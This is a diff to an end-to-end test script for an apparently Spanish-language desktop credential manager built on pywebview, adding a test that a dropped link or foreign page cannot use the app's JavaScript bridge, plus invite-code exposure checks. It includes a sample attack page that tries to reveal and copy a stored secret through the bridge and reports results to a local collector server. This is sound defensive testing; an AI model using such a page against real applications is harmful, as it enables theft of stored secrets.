@@ -174,6 +174,45 @@ if "ALTER ROLE" in sql:
 '''
 
 
+# A page that is not the app's: what a link or an .html file dropped on the window would load. pywebview gives every
+# page it loads the bridge to the app (window.pywebview.api); this one tries to use it and reports what it got.
+ATTACK_PAGE = """<!doctype html><meta charset="utf-8"><title>drop</title><body>dropped<script>
+const report = (what) => fetch('/report?' + encodeURIComponent(JSON.stringify(what)));
+(async () => {
+  for (let i = 0; i < 60 && !(window.pywebview && window.pywebview.api && window.pywebview.api.call); i++)
+    await new Promise((r) => setTimeout(r, 100));
+  if (!(window.pywebview && window.pywebview.api && window.pywebview.api.call)) { report({ bridge: false }); return; }
+  const api = window.pywebview.api, out = { bridge: true };
+  const tries = { reveal: () => api.call('reveal', { id: 'echo-api', field: 'value' }), copy: () => api.copy_secret('echo-api', 'value'),
+    status: () => api.status(), info: () => api.info(), approvals: () => api.call('pending_approvals') };
+  for (const [name, run] of Object.entries(tries)) {
+    try { out[name] = JSON.stringify(await run()); } catch (e) { out[name] = 'refused: ' + ((e && e.message) || e); }
+  }
+  report(out);
+})();
+</script>"""
+
+
+class Attacker(http.server.BaseHTTPRequestHandler):
+    visits, reports = [], []
+
+    def do_GET(self):
+        if self.path.startswith("/report?"):
+            import urllib.parse
+            Attacker.reports.append(json.loads(urllib.parse.unquote(self.path.split("?", 1)[1])))
+            body = b"{}"
+        else:
+            Attacker.visits.append(self.path)
+            body = ATTACK_PAGE.encode()
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, *args):
+        pass
+
 def fake_profile():
     """A Claude Code conversation where the AI saw a key."""
     CONVERSATION.parent.mkdir(parents=True)
@@ -248,6 +287,39 @@ def main():
     sys.exit(1 if failures else 0)
 
 
+def foreign_page_flow(page):
+    """Dropping a link (or an .html file) on the window: the window must stay on the app, and a page that got
+    there anyway gets nothing from the app's bridge."""
+    print("A link or a file dropped on the window")
+    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Attacker)
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    url = f"http://127.0.0.1:{server.server_address[1]}/evil.html"
+    home = page.js("location.href")
+    box = page.js("(() => { const r = document.querySelector('.list').getBoundingClientRect(); return [r.x + r.width / 2, r.y + r.height / 2]; })()")
+    data = {"items": [{"mimeType": "text/uri-list", "data": url}, {"mimeType": "text/plain", "data": url}], "dragOperationsMask": 1}
+    try:
+        for kind in ("dragEnter", "dragOver", "drop"):
+            page.send("Input.dispatchDragEvent", type=kind, x=box[0], y=box[1], data=data)
+    except RuntimeError as exc:
+        print(f"  ...  this web view can't simulate a drop ({exc})")
+    time.sleep(3)
+    check(not Attacker.visits and wait_for(lambda: page.js("location.href") == home, 5),
+          f"dropping a link on the window doesn't open it: the window stays on the app ({Attacker.visits})")
+    # However a foreign page gets in (a drop the page doesn't see, a navigation), it must get nothing.
+    try:
+        page.send("Page.navigate", url=url)
+    except RuntimeError:
+        pass
+    wait_for(lambda: Attacker.reports, 10, 0.2)
+    reports = list(Attacker.reports)
+    answered = [k for r in reports for k, v in r.items() if k != "bridge" and not str(v).startswith("refused")]
+    check(LEAKED not in json.dumps(reports) and not answered,
+          f"a page that isn't the app's gets nothing from it ({'it never loaded' if not reports else reports})")
+    check(wait_for(lambda: page.js("location.href") == home and "Echo API" in page.text(), 20),
+          "and the window is back on the app")
+    server.shutdown()
+
+
 def run(app, env, devtools, api_port, client, integrations):
     print("Window")
     page = Page(devtools)
@@ -299,6 +371,7 @@ def run(app, env, devtools, api_port, client, integrations):
     page.js("loadEntries().then(renderMain)")
     check(wait_for(lambda: "Echo API" in page.text() and "pruebas" in page.text()), "it shows in the list, with its tag")
     page.shot("02-credentials")
+    foreign_page_flow(page)
 
     print("Screens")
     for view, expected, name in (("access", "Qué puede hacer la IA", "03-access"), ("settings", desktop.os_text("Abrir con mi sesión de Windows"), "04-settings"),
@@ -1587,6 +1660,14 @@ def teams_flow(page, env):
     check(wait_for(lambda: "Invitada · aún no ha entrado · caduca el " in page.text() and "Reenviar" in page.text()
                    and "Retirar" in page.text(), 10),
           "the person shows as invited, not in yet, until when; it can be re-sent or withdrawn")
+    check("invite_id" not in json.dumps(page.js("state.teamData")), "the page's list of people has no invite code")
+    prompts = page.js("window.__prompts || 0")
+    page.click("Copiar instrucciones", ".member button")
+    check(wait_for(lambda: "Instrucciones para bob@example.com" in page.text()
+                   and "Código de invitación" in page.js("(document.querySelector('.instructions') || {}).textContent || ''"), 10)
+          and page.js("window.__prompts || 0") == prompts,
+          "«Copiar instrucciones» on an invited person gets the code from the service, with one click")
+    page.js("document.querySelector('.overlay').dispatchEvent(new Event('dismiss'))")
 
     print("An invitation that expired")
     fill(page, "E-mail de la persona", "carla@example.com")
